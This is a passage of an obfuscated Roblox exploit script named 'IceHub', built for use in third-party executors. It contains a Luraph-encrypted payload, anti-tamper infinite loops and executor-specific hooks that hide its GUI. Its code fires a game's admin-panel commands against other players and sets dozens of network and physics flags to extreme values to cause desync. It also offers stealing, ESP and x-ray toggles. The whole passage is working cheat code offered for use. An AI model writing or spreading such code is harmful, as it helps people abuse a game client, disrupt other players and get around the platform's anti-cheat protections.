												fn14(95, v3[fn2("\132", 22787644412646)], v3[fn2("\"\140\144$Il~ٳz\219Z\206:\t", 447764005281)])

												while not flag19 or not flag18 do
													v21()
												end
											end
										end

										do
											do
												fn14(100, v3[fn2("^\156\160\174\193/5\1494\0U\206\225\165}", 10029054698620)], v3[fn2("[Q7ð=\11x\218~\1302}\200\234/m\228.\159", 31806277219253)] .. v29() - now .. v3[fn2("\252", 21953321553885)], Color3[v3[fn2("wܽ", 20447889574499)]](0, 1, 0), v3[fn2("\211\225ף", 11135042529410)])
												v82 = nil

												do
													local tbl20 = {
														[13] = 8,
														[10] = 248,
														[11] = 117,
														[12] = 36,
														[17] = 101,
														[14] = 45,
														[15] = 203,
														[16] = 88,
														[8] = 140,
														[9] = 21,
														[2] = 111,
														[5] = 1,
														[7] = 81,
														[3] = 211,
														218,
														[4] = 188,
														[6] = 72,
													}

													luraph_runtime1(v81, buffer.fromstring("\8\144\217!\243d\241\187\134\196X|\31Q\227i.N7M\158\26md$\170w\170y\182t=D\194\197D6B\162`\215p@\189\153?\131\177\211\12Է\195\203/\\\152ǀ\194\239~\188r\253\2047\195ƻE\173\127=\205\214b\239\30\147\204Ûl\240\2\188\240hM\177T\30\151\255㱻٭\145X\136\207\3\252\131\17\27\187N\135\139\215\2\6\143\213#:Aҟ10\158\249\138\175\216%|\130l؇\29\248\1717\235\nj\26\224\220`\133\4%D&\242\224\127\15\150\233\176%\12(Xcs!\144\216X\18\154\130\25vb7C\152\179\1554\2038\1\153ln\31\27\205nNgJ\203\218\24\133Ɍ\17\238\200y\226:y\127\184\180\198H\240)e<Y\248\196\208X\252\249\157\210\127\179\252U\250\206(\252\2257\139\197S\14\172\228\140\14\1509\242\140[\155\21\245Zb\237\2304\221\n\27Q\178\27#\186\31\206\199/\129E\152(\127\155\199>\r\25\229\161Ê\30\242\215͑\232\190G4\r\4\129\21\251Z\177\197\240\215N\2441t\27sN֘7\240\253\130\177Y\r\129Es\226@\28\24\139\195c{\211X&\225\241\164\3M\127\28\226\29w2\145\26\207\245\185\4%\217[1\247\\<d\230\192\t\247\193ͳC\159\142\240\1416tͦQ\n\16`\174\135\198Y\165$ͽm\172E|\154 \131\1275\179bst\247\20375\231&\172\249a\205O_\131\173\12k:'\0030\168\172\205\26\157\163k\134HJ\2334\214$\164ͻ\152<\210\236\174\232\171I\25\142\160S\197U\24\238hî3\14_\17A\145Zk\29\162m\190EB\155\r\173\162;`\229\239E\130\131\157I\168I\208/\27\0301\129\1\128\215.S\170\237\205\254\254F澷\11\2480\174\16\140(\235N\229@bˇ\212\0202\237\139]\30\217\25\177\164\251\0\142\173>B\228f\137\229\16\27S\171\136\187\249\194\6\24=\179\11I\135\179vCu7\203R\181\158\1764\141\182\22}A\193S\159/\147\25\184JE\242mՈ\12`R\230%X\228ox\177\190\201XZD\179~<\135\220\253\1763h\22\216|\149Ia\183\5û\165d\241\154\0061\214v\211D(h\"\180WIo[\2075\156\185\11\180\250\12C\222\251Tj\31g\168\20\203\25\154x\207\25P$\144\2\169\158.(\174\172\176!ddtlő\184\236>Hf\254c\183D\1384\142\147>,\189\tKӱQ̉\225\n\209&'\161\5\230\3j\157\161\215I\223U\196mk8\192\171D\11=\187\213\195&1F\135\22\t\155|\u{5FA}\151\158&\158h\155\30\149F\25\2436\235\223Fȅ\30\229\r=j\7\15\235\30\165\2357\143\17\230\137\240A\233+\25\131\168\175\165\158\157\224\234&\192\160k\135\133\188\143\246!\248\174\165\193\138Ʃ\u{74B}\146\233\3x\\z|\142\234?\188\226\202\244$\245\245\127\r\27\232\159i\199\212>*\194d\168o\250E\250\n\254\144\27@V*\26\14\211\221\17\211]N\141\169Ak\188;\160j\178\26yf>\137\231r\16\"kTųj\131\185\127`\149À\158\127p\19\127)E\243\29\3\206\217\244\247[\186\6Qơc\219\196d-q\228\242\138\130\14\251i`<ֶ/\246\148\198\r\1423r\242w3\30\252,)\249\1NM\174\2339\132\153!\145f[K\176\179\236\26\254\181\164R9ݕ\5\199@\210<\20\17\189Ș\196]뢱x\231\188\215D\219oa\8\243\184\242c\3\t\150\134\\\158\203-\146t\221w\178\1477\142K\219\4\247L\210zn\251J@\232\140s'\177O\140q\23h\154A\232\u{F3B2}\240uL\236-J;\134\136V\183\245D\27?\231\22\214\2160߈\227\191\222\237\183\235\2271Z\146\213<\250\5\230\235ʛ\8\133Ş\7ѓwn\2M6T\":\2\137\142[C\207\217\196\217 gU\144\2115!\244\190\2067\254\202r\20P\243\131\174\25\19\2288\240\t0\213\246\219\5\146\165\18\161\132}\236V\255\127\229\243L\233p\226\188\237c\215Y\158,\252к\8\27\238\0267\19w\208\30\186\153\149_<2\140]u\229w\178j\185\nȺ\0066X\134\171ˬ\178\198#\136\190\133\2289=\182L\144!u\24\132\30\2082\rx\174\244(Em)\242\149\29?\8\254\18hl\205\206\3\16n.\28a\23\193\14z\201\2517\220hP\166`\236\169|1\11ܦk\\\11\188w%\241;\248/\151\211\29\184\193\11\202\21\154\253p\165\142\4R\r\142r\1820\189\235t\18\144\180\249\7\0214\16\127~\28\165\194r\"*\19\134Y\139\249\24\31\142;*\135\216\222ҞS/\r\139[JN\22l\189\131\7\12K\29\248\142\248O,ş\243\20\149kצdF(s\253\186\1\28\229|\25298U\3\223a\140\183\244\140YQ\136\246\209h\134\11\203q\149\210b\0\14\254G3\228K\134dev\14?\212\205\27N\24ƕ\175f\238\1787\24>\2o\224|v\153&_\22\158W\194\208eg\158\187z\202\21P\171g\192\154\243\172\206\31\tq\209B\134\152y\131,\18\237P\159\182\228\246Y\27}\243!\252\164\14\208\14\138\14\206/it\152UlJ|\216֭\223Q\03197\185\236\246o\254 h\24\"\27ޮ%\184\254dF\1400y\141jt\230G\"ˊ\8vOW2J\139\186\196L\239;\190$\143\242\251@)\23uz\129L\179I\140D\220V\177\164\27>ũ\22\2\2400,L\17\245\31\27+,\148\192.\206C\187de\"\168v\138gJJ\2355E\2067FY\148\140\153)\234-\154(BxEz\161}\20=WB\28\136x\159\230f_\213\192\5\1723=l\138G3\26B4\239б\29\151\255ތ$E\27\200\2443\171\157\170\247\170@\29\179\161qK\202i\19R˄N\158\147,\140:\179\131E,zʳ\229\199l\223\12fFj\254\1\238G\154_O\161a\244覔\128\163\11\4t\179\237\169\155\3&4\205a\201Щܲ\n\185x\224\242M\222\198\195\247\203>\240α\183[\216\"\11\228IY\n\190\17̃rѨI,\210߉\25ݙ\210-l\131m<\3\235\248e\1753>,\133I\130\222S\170\1556\145\168\248\159x&K\191\23H;$p\130\177\127k\26'7\195Úϑ\148(\147\23\206\25\134\161\155p\132 \221\233\225H\217\1\136\25_\218Y\16n\6G\137.WZ\27\29\129\234OMϯ\3<\186\243|{\23$\206l`\140\157ո\177\212'z\241W\153\239\16T\186҉\195\235Ve\154\15MA/\130\248h\11[t\133/Q)\241F!\129\140\224 \147\1N\235\161\208u\0\178S \192\208W\215`\181\0244\146\149F\20\18\23jy\233\rf_\254~Z\247\216}\139\204dN*^\226\246!\132^[\231\167W(\154]\191\185'\182\141\23=\133Մ-\146\223\237\245G\161\214.V\194\238\197{\252\138U\227N\231\181\219\254\184\189\137\247(\1\31^nm\\\216\236\234D*_s\21k\163RL=\t^!\1439n\0p$\218n\1426\201go\19|\186\161\214\15\1543g\164t\134h2\199vy*:B\16\162\163 \137?\128i\226\181\201*B\227Je\253\163\1\2Tv\134G|\129\181Kv\0029\11\28}lL\150\229f\200\224д\233iҌ\230\4\191\15WOX\135@\251\147u]\163\tI\134\194S\159\160\31P\134\238WsM8\175\164\140\255\26P\144\129\227\26\162\254?\237\169\245$/@\7i#dy1\129u\155\139nY\208E\18u\204\240\1394Wͼ\156\138\221\250\232\248o\144\152\233\19\242\1j1\240\193\254\19b\131\r\218]\155^\227\210p\186\222}\"\19\145B\249v\152=&+\r\173\180Ů\26!\148\6\206F\221\239\31\229b\135\170\12Z_O\164<\158gB\2\245\240o˄\212J\22\191a\146\219_\2095d\253u\155\173\166\228\211eB\227:sʿLe\11\210\204\229\255JK\25Q\2397\250\209(\227\1525\193\173\218H\183\217\237!C\250jz\191Yuc<\140\199\195sr\130\248\11\158\200\235\225\156\21\218ʂ\31l\199\212\226y\154I\191\224\229,\231J\243\202\216rg_DʆlݨFt\23\139\1954\232\31\246\7\18\133\22\226N\214O\182\239\158\2235\203ǹ\243\127\150\242\15\26\182\191\234W\179G\166`$\136\208fN\243\214x\214\244B\165\191\160Q*\28fMH\211\235\30\240Ѱ\187\140\192\27\177+;\3\230\248έ\136\2\22\143O*P\6J\206\241\254\189\12\234\12\146\0223\170K3\200L\tYn\2142d\198\231\144l\183QͿ\172\142\237ޞ?'銹]\20\136\5\1\19\203!Ys\2\163\198a\255ʩ\173L\"\3\239\236\14\157\220\22ͷW\5/ƲՔvLL\202\20\153\192\132\242p\1741\139\231'mj\246ːj\0058\146\142\0048\159`\196\127\255\198\23\19\0cR\198F\22\16\209\219\27H!\202ع\182\245̎Y\244|ź\214\247\234Q\200\tAKq2Χ*\158\u{5EE}_#U\182\235/\130\30\172-ϕ\130\5\246\182\29\181\149o%\244\162\136\134\135\174\tS\160\186\217n\200!\171{\163\240{.-lU\127\28\21\14\213(9\243Q\184\150Ql?x\3\136`\2529\155\245\251h\129\182ǩ\15\135\141\152\1804`\248\165\7'\1454\138j\190\241\208\240ֽ\u{88}m\248Y\169^}\"X\232M$C\134\136\238\192\193\237мꖊ+!1\192XV%\176\1360\27\238w\232XT \149S5A\242z^\140\2\227Z8#\"tcF\130\181\193d\166aP\234cR\151\201\224\204\2\152Ц\230\196\245'?\182\2558%\6\3\163EB\204R\207c_n\151\245\245\21\174\146\2127\142\186o\230{\184\2287d&\175(]%[b\148\215\24꣣%\251\230\214'\12\231aa\r\204K\2\20\229脽\15\235\128t\"\168\157\0050\157\26\193\137{ܑ\151F\25\14\241\18\172\\\186\n\240\233\138\24{\234\128qO\3\19vW\21l]gqc\127\254[\209\20\27iai\12ouM\226p\173\28\128\29/J\206\236\200eLެ\199\196(\6=\n\240\0053\172`\164_\239i\145:%:\26f\220cQhl\t\19;\16\4c\175I\231\6.f\199$=0\187\154\245\r\0151\254{\237ǁ\137\172\5\132\150EJ=&\158\194\27O\191\146H\194N\136CD[#\169\181\222\22\153\142H\242:\151$\136\2024T\165L\141F\243\27\182~w\181٢-b^\130\28\236I\236v\240c\216~Ͻ\246Ѳ,\240:\191q%M\165\0\220x\15=(K#\242B\131v\140\217Yځ\n\18\221\1\220E\155d\181]c\169w\211\197*\188#`\185\243s\170\179ɔ\140^t\14왮\20l\22\0\n\228\130\237\204uޱ\196\26\130\143\1i\146\148~\2514=\201\213G\213>\u{5CB}\159-\26\161\174K\25!\216a8\136Z\171\190\146\220.\127qa\29\201\227IV\187\155H\15'\202\247\22\168&&\1733u&mB"), tbl20, 138)()
												end
											end

											if not game:IsLoaded() then
												game.Loaded:Wait()
											end

											if setfpscap then
												setfpscap(9999)
											end

											Players = game:GetService("Players")
											service = game:GetService(v82[106])
											RunService = game:GetService("RunService")
											TweenService = game:GetService("TweenService")
											UserInputService = game:GetService("UserInputService")
											HttpService = game:GetService("HttpService")
											CoreGui = game:GetService("CoreGui")
											service2 = game:GetService(v82[34])
											TeleportService = game:GetService("TeleportService")
											game:GetService(v82[54])
											service3 = game:GetService(v82[74])
											localPlayer = Players.LocalPlayer
											playerGui = localPlayer:WaitForChild("PlayerGui")
											math.randomseed(os.time() + tick() * 1000)

											do
												local function fn50()
													local v85 = v82[67]
													local tbl20 = {}

													for i = 1, v82[78] + math.random(0, 8) do
														local random2 = math.random
														local v86 = v82[138]
														tbl20[i] = v85:sub(math.random(v82[118], 62), random2(1, v86))
													end

													return table.concat(tbl20)
												end

												fn29 = function(arg)
													local CoreGui2 = game:GetService("CoreGui")
													local playerGui2 = Players.LocalPlayer:WaitForChild("PlayerGui")

													for _, v85 in ipairs({ "gethui", v82[172] }) do
														local value = rawget(_G, v85)
														if type(value) ~= "function" then
															continue
														end
														local ok, parent = pcall(value)

														if ok and typeof(parent) == "Instance" then
															if pcall(function()
																arg.Parent = parent
															end) and arg.Parent == parent then
																return true
															end
														end
													end

													local value = rawget(_G, "syn")

													if value and type(value.protect_gui) == "function" then
														if pcall(value.protect_gui, arg) then
															pcall(function()
																arg.Parent = CoreGui2
															end)

															if arg.Parent then
																return v82[76]
															end
														end
													end

													for _, v85 in ipairs({ "protectgui", "protect_gui" }) do
														local value2 = rawget(_G, v85)

														if type(value2) == "function" then
															pcall(value2, arg)
														end
													end

													pcall(function()
														arg.Parent = CoreGui2
													end)

													if not arg.Parent then
														pcall(function()
															arg.Parent = playerGui2
														end)
													end

													return arg.Parent ~= nil
												end

												v83 = fn50
											end
										end

										pcall(function()
											if getgenv().IceHubLoaded then
												return
											end
											local v85 = v82[76]
											getgenv().IceHubLoaded = v85
										end)

										tbl17 = {
											adminRemote = nil,
											lastFired = {},
											defMode = "None",
											defLastPunish = {},
											defStealCounts = {},
											Connections = {},
											enemyPlots = {},
											stealCbCache = {},
											stealActive = false,
											stealBusy = false,
											lastTpTime = 0,
											allGradients = {},
											isMobile = false,
											redPos = nil,
											greenPos = nil,
											redDot = nil,
											greenDot = nil,
											guideLine = nil,
											sentryEnabled = false,
											sentryConn = nil,
											gameStretcherEnabled = false,
											gameStretcherConn = nil,
											AutoResetBalloonEnabled = v82[120],
											balloonGuiConnections = {},
											balloonChildAddedConn = nil,
											menuOpen = false,
											screenGui = nil,
											statsLabel = nil,
											panel = nil,
											topButtons = {},
											tabButtons = {},
											tabContents = {},
											PANEL_W = 560,
											PANEL_H = 470,
											HUD_WIDTH = 310,
											HUD_HEIGHT = 74,
											COL_DARK = Color3.fromRGB(7, 13, 27),
											COL_WHITE = Color3.fromRGB(235, 245, 255),
											COL_DIM = Color3.fromRGB(v82[63], 185, 255),
										}

										do
											local accentKeys = {}
											local v85 = ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(70, 145, 255))
											local v86 = ColorSequenceKeypoint.new(0.2, Color3.fromRGB(v82[80], 190, 255))
											local v87 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(235, 248, 255))
											local v88 = ColorSequenceKeypoint.new(v82[81], Color3.fromRGB(90, 170, 255))
											local v89 = ColorSequenceKeypoint.new(0.8, Color3.fromRGB(45, 115, v82[175]))
											accentKeys[1] = v85
											accentKeys[2] = v86
											accentKeys[3] = v87
											accentKeys[4] = v88
											accentKeys[5] = v89

											do
												local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(105, 190, v82[196])))
												table.move(values, 1, values.n, 6, accentKeys)
											end

											tbl17.ACCENT_KEYS = accentKeys
										end
									end

									do
										do
											local bgKeys = {}
											local v85 = ColorSequenceKeypoint.new(0, Color3.fromRGB(5, v82[4], 22))
											local v86 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, v82[133], 72))
											bgKeys[1] = v85
											bgKeys[2] = v86

											do
												local values = table.pack(ColorSequenceKeypoint.new(v82[118], Color3.fromRGB(v82[188], v82[88], v82[149])))
												table.move(values, 1, values.n, 3, bgKeys)
											end

											tbl17.BG_KEYS = bgKeys
										end

										tbl17.epFrame = nil
										tbl17.epContent = nil
										tbl17.openExecutePanel = nil
										tbl17.closeExecutePanel = nil
										tbl17.xpFrame = nil
										tbl17.xpContent = nil
										tbl17.openXrayPanel = nil
										tbl17.closeXrayPanel = nil
										tbl17.bpFrame = nil
										tbl17.bpContent = nil
										tbl17.openBoosterPanel = nil
										tbl17.closeBoosterPanel = nil
										tbl17.spFrame = nil
										tbl17.spContent = nil
										tbl17.openServerPanel = nil
										tbl17.closeServerPanel = nil
										tbl17.defFrame = nil
										tbl17.defContent = nil
										tbl17.openDefenderPanel = nil
										tbl17.closeDefenderPanel = nil
										tbl17.apFrame = nil
										tbl17.apContent = nil
										tbl17.openAPPanel = nil
										tbl17.closeAPPanel = nil
										tbl17.espFrame = nil
										tbl17.espContent = nil
										tbl17.openESPPanel = nil
										tbl17.closeESPPanel = nil
										tbl17.stretchFrame = nil
										tbl17.stretchContent = nil
										tbl17.openStretchPanel = nil
										tbl17.closeStretchPanel = nil
										tbl17.balloonFrame = nil
										tbl17.balloonContent = nil
										tbl17.openBalloonPanel = nil
										tbl17.closeBalloonPanel = nil
										tbl17.turretFrame = nil
										tbl17.turretContent = nil
										tbl17.openTurretPanel = nil
										tbl17.closeTurretPanel = nil
										tbl17.btFrame = nil
										tbl17.btContent = nil
										tbl17.openBTPanel = nil
										tbl17.closeBTPanel = nil

										do
											local flag18 = v82[120]

											local function fn50()
												local v85 = playerGui:FindFirstChild(v82[124])
												if not v85 then
													return nil
												end
												local adminPanel = v85:FindFirstChild("AdminPanel")
												if not adminPanel then
													return nil
												end
												local profiles = adminPanel:FindFirstChild("Profiles")
												profiles = profiles and profiles:FindFirstChild(v82[41])
												local scrollingFrame = adminPanel:FindFirstChild(v82[158])
												scrollingFrame = scrollingFrame and scrollingFrame:FindFirstChild("ScrollingFrame")

												if not profiles or not scrollingFrame then
													if not flag3 then
														return
													end
													return nil
												end

												return { Gui = v85, Panel = adminPanel, Profiles = profiles, Commands = scrollingFrame }
											end

											local function fn51(arg)
												if not arg or not arg:IsA("GuiButton") then
													return false
												end

												if type(firesignal) == "function" then
													if pcall(function()
														firesignal(arg.Activated)
													end) then
														return true
													end

													if pcall(function()
														firesignal(arg.MouseButton1Click)
													end) then
														return true
													end
												end

												if type(getconnections) == "function" then
													for _, v85 in ipairs({ arg.Activated, arg.MouseButton1Click }) do
														local ok, result = pcall(getconnections, v85)

														if ok then
															local v86 = v82[29]
															ok = type(result) == v86
														end

														if ok then
															for _, v86 in ipairs(result) do
																if type(v86.Function) == "function" then
																	if pcall(v86.Function) then
																		return true
																	end
																	continue
																end

																if v86.Fire then
																	if pcall(function()
																		v86:Fire()
																	end) then
																		return v82[76]
																	end
																end
															end
														end
													end
												end

												return false
											end

											fn30 = function(arg)
												local v85 = fn50()
												if not v85 then
													return nil
												end
												local v86 = v85.Commands:FindFirstChild(arg)
												if v86 and v86:IsA("GuiButton") then
													return v86
												end
												local str8 = tostring(arg):lower()

												for _, child in ipairs(v85.Commands:GetChildren()) do
													if child:IsA("GuiButton") and child.Name ~= "Template" then
														if child.Name:lower() == str8 then
															return child
														end
														local v87 = child:FindFirstChild(v82[134])

														if v87 and v87:IsA("TextLabel") then
															if tostring(v87.Text):lower():gsub("^;", ""):gsub("%s+", "") == str8 then
																return child
															end
														end
													end
												end

												return nil
											end

											fn31 = function(arg, parent)
												if not arg or not parent then
													return false
												end
												local imageLabel = arg:FindFirstChildWhichIsA("ImageLabel", true) or arg:FindFirstChildWhichIsA("ImageButton", true)
												if not imageLabel then
													return false
												end
												local clone = imageLabel:Clone()
												clone.Name = "NativeIcon"
												clone.AnchorPoint = Vector2.new(0.5, 0.5)
												clone.Position = UDim2.fromScale(0.5, 0.5)
												clone.Size = UDim2.new(v82[118], -8, 1, -8)
												clone.BackgroundTransparency = 1
												clone.ZIndex = parent.ZIndex + 1

												if clone:IsA("ImageButton") then
													clone.AutoButtonColor = false
													clone.Active = false
												end

												clone.Parent = parent
												return v82[76]
											end

											local function fn52(arg)
												if not arg then
													return nil
												end
												local v85 = fn50()
												if not v85 then
													return nil
												end
												local v86 = v85.Profiles:FindFirstChild(arg.Name)
												if v86 and v86:IsA("GuiButton") then
													return v86
												end

												for _, child in ipairs(v85.Profiles:GetChildren()) do
													if child:IsA("GuiButton") and child.Name ~= "Template" then
														if child.Name == arg.Name then
															return child
														end
														local playerName = child:FindFirstChild("playerName")
														if playerName and playerName:IsA("TextLabel") and playerName.Text == arg.Name then
															return child
														end
													end
												end

												return nil
											end

											fn32 = function(arg, arg2)
												if not arg or arg.Parent ~= Players then
													return false
												end
												local n35 = os.clock() + 1.5

												while flag18 and os.clock() < n35 do
													task.wait()
												end

												if flag18 then
													return false
												end
												flag18 = true
												local flag19 = false

												local ok = pcall(function()
													local v85 = fn30(arg2)
													local v86 = fn52(arg)
													if not v85 or not v86 then
														return
													end

													if not fn51(v85) then
														return
													end
													task.wait(0.01)
													if not fn51(v86) then
														return
													end
													flag19 = true
													tbl17.lastFired[arg2] = tick()
												end)

												flag18 = false
												return ok and flag19
											end
										end
									end

									do
										do
											local tbl20 = { "rocket", v82[93], "balloon", v82[79], v82[109] }

											fn33 = function(arg)
												if not arg then
													return
												end

												for _, v85 in ipairs(tbl20) do
													fn32(arg, v85)
													task.wait(0.02)
												end
											end
										end

										fn34 = function(arg)
											pcall(function()
												if arg:IsA("ParticleEmitter") then
													arg.Enabled = false
												elseif arg:IsA("Decal") then
													arg.Transparency = v82[118]
												elseif arg:IsA("BasePart") then
													arg.Material = Enum.Material.Plastic
													arg.Reflectance = 0
													arg.CastShadow = v82[120]
												end
											end)
										end

										fn35 = function()
											pcall(function()
												service2.GlobalShadows = false
												service2.FogEnd = 9e9
												service2.Brightness = 1
												service2.EnvironmentDiffuseScale = 0
												service2.EnvironmentSpecularScale = 0

												for _, child in pairs(service2:GetChildren()) do
													if child:IsA(v82[182]) or child:IsA("BlurEffect") or child:IsA("SunRaysEffect") then
														child.Enabled = false
													end
												end
											end)
										end

										do
											local str8 = "Unknown"
											local flag18 = false

											pcall(function()
												if identifyexecutor then
													str8 = identifyexecutor()

													if str8:lower():find("delta") then
														flag18 = true
													end
												end
											end)

											local str9 = str8:lower()

											if str9:find("delta") or str9:find("codex") or str9:find(v82[100]) then
												tbl17.isMobile = true
											elseif UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
												tbl17.isMobile = v82[76]
											end

											if tbl17.isMobile then
												if flag18 then
													tbl17.HUD_WIDTH = v82[65]
													tbl17.HUD_HEIGHT = 45
													tbl17.PANEL_W = 350
													tbl17.PANEL_H = 390
												else
													tbl17.HUD_WIDTH = 340
													tbl17.HUD_HEIGHT = v82[141]
													tbl17.PANEL_W = 350
													tbl17.PANEL_H = 390
												end
											end
										end
									end

									tbl18 = {
										guiPositions = {
											main = { x = 0.5, xOffset = 0, y = 0.5, yOffset = 0 },
											hud = { x = 0.5, xOffset = 0, y = 0, yOffset = v82[32] },
											semiTp = { x = 0.02, xOffset = v82[46], y = 0.5, yOffset = 0 },
											instaReset = {
												x = v82[91],
												xOffset = 0,
												y = v82[91],
												yOffset = v82[25],
											},
											autoDefense = {
												x = v82[91],
												xOffset = -115,
												y = 0,
												yOffset = v82[152],
											},
											friendPanel = {
												x = v82[51],
												xOffset = 270,
												y = v82[91],
												yOffset = -66,
											},
										},
										panels = {
											semitp = {
												x = 0.5,
												xOffset = -100,
												y = v82[91],
												yOffset = -190,
												visible = true,
											},
											xray = {
												x = v82[46],
												xOffset = v82[69],
												y = 0.5,
												yOffset = -60,
												visible = true,
											},
											booster = {
												x = 1,
												xOffset = -220,
												y = v82[91],
												yOffset = -117,
												visible = true,
											},
											server = {
												x = 1,
												xOffset = -v82[9],
												y = 0.5,
												yOffset = 128,
												visible = true,
											},
											defender = {
												x = 1,
												xOffset = -v82[68],
												y = 0.5,
												yOffset = -60,
												visible = true,
											},
											ap = {
												x = v82[118],
												xOffset = -420,
												y = 0.5,
												yOffset = 100,
												visible = true,
											},
											esp = {
												x = 1,
												xOffset = -620,
												y = 0.5,
												yOffset = -60,
												visible = true,
											},
											stretch = {
												x = 1,
												xOffset = -620,
												y = 0.5,
												yOffset = 100,
												visible = true,
											},
											balloon = {
												x = 0.5,
												xOffset = 250,
												y = 0.5,
												yOffset = -60,
												visible = true,
											},
											turret = {
												x = v82[91],
												xOffset = 250,
												y = 0.5,
												yOffset = 60,
												visible = v82[76],
											},
											baseTimer = {
												x = 0.5,
												xOffset = 450,
												y = 0.5,
												yOffset = -60,
												visible = true,
											},
										},
										toggles = {
											antiRagdoll = true,
											unlockBase = v82[76],
											customFOV = true,
											boosterPanel = true,
											serverPanel = v82[76],
											xrayPanel = v82[76],
											defenderPanel = true,
											apPanel = true,
											espPanel = true,
											stretchPanel = true,
											balloonPanel = true,
											turretPanel = v82[76],
											baseTimerPanel = true,
											semiTpPanel = true,
											showRejoinGui = v82[76],
											walkSpeed = false,
											antiLag = false,
											fpsBooster = v82[120],
											noParticles = false,
											antiBee = v82[120],
											friendBaseESP = true,
											gameStretcher = false,
											autoResetBalloon = false,
											antiTurret = false,
											playerESP = false,
											trapESP = false,
											brainrotESP = false,
											bestBrainrotESP = false,
											lineESP = v82[120],
											playerChams = false,
											selfChams = v82[120],
											brainrotChams = v82[120],
											trapMineChams = false,
											defenderKick = false,
											defenderNoKick = v82[120],
											intruderAlarm = false,
											autoLeave = v82[120],
											baseTimerESP = false,
										},
										autoLeaveCooldown = v82[23],
										ui = { activeTab = v82[26], menuOpen = false },
										autoDefense = {
											enabled = false,
											balloon = true,
											laser = false,
											settingsOpen = false,
										},
										semitp = {
											autoPotion = true,
											autoWalk = v82[120],
											speedBoost = false,
											autoAdminSpam = false,
											autoRetrySteal = false,
											autoSemiOnTimer = v82[120],
											autoSemiOnFriends = v82[120],
											semiInstantMode = v82[103],
											stealMethod = "Walk",
											stealKey = "E",
											selectedSlot = 1,
											walkSpeed = 26,
											speedBoostStealingSpeed = 26,
											speedBoostGiantSpeed = 34,
											tpCooldown = v82[180],
										},
									}

									do
										local fn50 = nil

										fn50 = function(arg, arg2)
											for k, v85 in pairs(arg2) do
												if type(v85) == "table" and type(arg[k]) == "table" then
													fn50(arg[k], v85)
												else
													arg[k] = v85
												end
											end
										end

										fn36 = function()
											if writefile then
												pcall(function()
													local v85 = v82[94]
													if n27(545) > v85 then
														writefile("IceHub_Settings.json", HttpService:JSONEncode(tbl18))
														return
													end

													while true do
													end
												end)
											end
										end

										local function fn51()
											if readfile and isfile then
												pcall(function()
													if isfile("IceHub_Settings.json") then
														local data = HttpService:JSONDecode(readfile("IceHub_Settings.json"))

														if type(data) == "table" then
															fn50(tbl18, data)
														end
													end
												end)
											end
										end

										fn51()
									end
								end

								do
									local fn50, fn51, v85, fn52, fn53, fn54, fn55, fn56, fn57

									do
										do
											tbl18.ui = tbl18.ui or { activeTab = "Stealer", menuOpen = false }
											tbl18.ui.activeTab = tostring(tbl18.ui.activeTab or "Stealer")
											tbl18.ui.menuOpen = tbl18.ui.menuOpen == v82[76]

											tbl18.autoDefense = tbl18.autoDefense or {
												enabled = false,
												balloon = v82[76],
												laser = v82[120],
												settingsOpen = false,
											}

											if tbl18.autoDefense.balloon == nil then
												tbl18.autoDefense.balloon = v82[76]
											end

											tbl17.menuOpen = tbl18.ui.menuOpen

											fn37 = function(arg, arg2, position)
												if not arg then
													return
												end
												local guiPositions = tbl18.guiPositions and tbl18.guiPositions[arg2]

												if guiPositions and type(guiPositions) == "table" then
													arg.Position = UDim2.new(tonumber(guiPositions.x) or position.X.Scale, tonumber(guiPositions.xOffset) or position.X.Offset, tonumber(guiPositions.y) or position.Y.Scale, tonumber(guiPositions.yOffset) or position.Y.Offset)
												else
													arg.Position = position
												end
											end

											fn38 = function(arg, arg2)
												if not arg or not arg2 then
													return
												end
												tbl18.guiPositions = tbl18.guiPositions or {}

												tbl18.guiPositions[arg2] = {
													x = arg.Position.X.Scale,
													xOffset = arg.Position.X.Offset,
													y = arg.Position.Y.Scale,
													yOffset = arg.Position.Y.Offset,
												}

												fn36()
											end

											tbl18.semitp.speedBoostStealingSpeed = 26
											tbl18.semitp.walkSpeed = 26
											tbl17.sentryEnabled = tbl18.toggles.antiTurret or false
											tbl17.gameStretcherEnabled = tbl18.toggles.gameStretcher or false
											tbl17.AutoResetBalloonEnabled = tbl18.toggles.autoResetBalloon or false

											fn50 = function()
												if not (n24 > 9611) then
													pcall(function()
														if not setfflag then
															return
														end

														for k, v86 in pairs({
															GameNetPVHeaderRotationalVelocityZeroCutoffExponent = "-5000",
															LargeReplicatorWrite5 = "true",
															LargeReplicatorEnabled9 = "true",
															AngularVelocityLimit = "360",
															TimestepArbiterVelocityCriteriaThresholdTwoDt = "2147483646",
															S2PhysicsSenderRate = "15000",
															DisableDPIScale = "true",
															MaxDataPacketPerSend = "2147483647",
															PhysicsSenderMaxBandwidthBps = "20000",
															TimestepArbiterHumanoidLinearVelThreshold = "21",
															MaxMissedWorldStepsRemembered = "-2147483648",
															PlayerHumanoidPropertyUpdateRestrict = v82[200],
															SimDefaultHumanoidTimestepMultiplier = "0",
															StreamJobNOUVolumeLengthCap = "2147483647",
															DebugSendDistInSteps = "-2147483648",
															GameNetDontSendRedundantNumTimes = "1",
															CheckPVLinearVelocityIntegrateVsDeltaPositionThresholdPercent = "1",
															InterpolationFrameRotVelocityThresholdMillionth = "5",
															LargeReplicatorSerializeRead3 = v82[200],
															ReplicationFocusNouExtentsSizeCutoffForPauseStuds = v82[154],
															WorldStepMax = "30",
															CheckPVDifferencesForInterpolationMinRotVelThresholdRadsPerSecHundredth = "1",
															GameNetDontSendRedundantDeltaPositionMillionth = "1",
															InterpolationFrameVelocityThresholdMillionth = "5",
															StreamJobNOUVolumeCap = "2147483647",
															CheckPVCachedRotVelThresholdPercent = "10",
															CheckPVCachedVelThresholdPercent = "10",
															NextGenReplicatorEnabledWrite4 = "true",
															InterpolationFramePositionThresholdMillionth = "5",
															TimestepArbiterHumanoidTurningVelThreshold = "1",
															CheckPVDifferencesForInterpolationMinVelThresholdStudsPerSecHundredth = v82[20],
															GameNetPVHeaderLinearVelocityZeroCutoffExponent = "-5000",
															SimOwnedNOUCountThresholdMillionth = v82[154],
															TimestepArbiterOmegaThou = "1073741823",
															MaxAcceptableUpdateDelay = "1",
															LargeReplicatorSerializeWrite4 = "true",
														}) do
															pcall(function()
																setfflag(k, v86)
															end)
														end
													end)

													return
												end

												while true do
												end
											end

											fn50()

											localPlayer.CharacterAdded:Connect(function()
												task.wait(0.05)
												fn50()
											end)

